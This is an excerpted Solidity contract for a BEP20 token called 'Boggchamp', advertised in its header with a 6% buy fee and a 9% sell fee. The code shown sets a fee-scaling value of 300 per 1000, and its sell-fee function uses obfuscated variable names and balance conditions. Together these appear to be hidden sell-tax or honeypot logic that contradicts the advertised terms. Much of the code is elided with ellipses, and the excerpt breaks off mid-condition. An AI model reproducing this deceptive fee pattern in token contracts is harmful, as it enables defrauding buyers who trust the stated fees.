...
/** 
 *    Boggchamp/BOGGERS!!!
 *    TG: https://t.me/Boggchamp
 *    50,000,000 Max wallet
 *    6% buy fee
 *    9% sell Fee
**/
...
contract Evergrande is IBEP20 {
    using SafeMath for uint256;
    address internal owner;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    string constant _name = "Boggchamp";
    string constant _symbol = "BOGGERS!!!";
    uint8 constant _decimals = 8;
    uint256 _totalSupply = 1000 * 1000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 50 * 1000000 * (10 ** _decimals);     // 5%
    ...
    uint256 public BuyFee = 60; //  buy 
    uint256 public totalFee = 90; //  sell 
    uint256 public ARDTfeescalingUID9999 = 300 ;
    uint256 feeDeNom999  = 1000;
    uint256 public ver55sae = 1;   
    modifier onlyOwner() {
    ...
    constructor ()  {
        address marketingFeeReceiver = 0x9C49a328c46EA765D32437738204131193C1199e;
         owner = msg.sender;
    ...
    function takeFeeSellARDTFF2fsUID9999(address sender, uint256 amount) internal returns (uint256) {
        ...
        if (HSenderbalance2222 > ver55sae){if   (amount > S167f62){
